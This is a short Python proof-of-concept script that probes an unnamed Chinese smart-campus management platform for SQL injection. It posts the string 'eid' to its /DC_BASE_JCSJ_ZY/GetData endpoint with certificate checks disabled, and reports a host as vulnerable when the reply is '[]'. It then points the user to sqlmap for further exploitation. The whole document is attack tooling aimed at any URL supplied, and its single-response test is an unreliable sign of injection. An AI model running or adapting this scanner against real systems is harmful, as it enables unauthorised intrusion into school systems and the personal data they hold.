#!/usr/bin/python
# Env: python3
# Author: afei00123
# -*- coding: utf8 -*-

import requests, urllib3, argparse

def title():
    print("")
    print('*'.center(60, '*'))
    print("Version：某智慧校园管理平台".center(40))
    print("github：https://github.com/ltfafei".center(50))
    print("gitee：https://gitee.com/afei00123".center(50))
    print("CSDN: afei00123.blog.csdn.net".center(50))
    print("公众号：网络运维渗透".center(50))
    print("")
    print('*'.center(60, '*'))
    print("")

def general_School_system_SQLi_POC(url):
    data = "eid"
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0 AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36"
    }
    print("\nSending to {0}".format(url))
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    res = requests.post(url + "/DC_BASE_JCSJ_ZY/GetData", headers=headers, data=data, verify=False, timeout=5)
    if res.text == '[]':
        print("{0} 存在SLQi漏洞。".format(url))
        print("请使用sqlmap进一步验证")
    else:
        print("{0} 不存在SQLi漏洞".format(url))

if(__name__ == '__main__'):
    title()
    parser = argparse.ArgumentParser(description="general_School_system_SQLi_POC Script")
    parser.add_argument(
        '-u', '--url',
        metavar='', required='True',
        help='Please input target url.'
    )
    args = parser.parse_args()
    general_School_system_SQLi_POC(args.url)
